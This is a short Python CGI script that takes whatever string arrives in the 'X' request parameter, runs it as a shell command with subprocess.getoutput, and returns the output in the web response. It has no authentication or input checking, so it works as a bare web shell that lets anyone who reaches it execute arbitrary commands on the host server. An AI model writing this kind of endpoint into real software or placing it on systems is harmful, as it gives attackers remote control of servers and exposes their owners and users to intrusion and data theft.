#!/usr/bin/python3

import cgi

print("content-type: text/html")
print()

fields = cgi.FieldStorage()
cmd = fields.getvalue("X")
import subprocess as sp
output = sp.getoutput(cmd)
print(output)
